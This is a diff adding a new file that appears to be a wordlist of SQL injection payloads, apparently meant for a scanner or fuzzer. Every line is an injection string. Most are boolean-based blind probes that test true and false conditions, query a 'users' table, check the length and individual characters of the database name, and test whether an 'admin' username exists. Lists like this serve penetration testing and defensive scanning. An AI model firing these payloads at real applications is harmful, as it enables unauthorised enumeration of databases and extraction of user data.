@@ -1,0 +1,17 @@
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' OR 1=2 --
+' AND '1'='1 --
+' AND '1'='2 --
+' OR '1'='1 --
+' OR '1'='2 --
+' AND 1=1 AND '1'='1 --
+' AND 1=2 AND '1'='1 --
+' AND (SELECT 1 FROM users LIMIT 1) = 1 --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT LENGTH(database())) > 1 --
+' AND (SELECT SUBSTRING(database(),1,1)) = 'a' --
+' AND (SELECT ASCII(SUBSTRING(database(),1,1))) = 97 --
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --
+' AND (SELECT username FROM users LIMIT 1) = 'admin' --
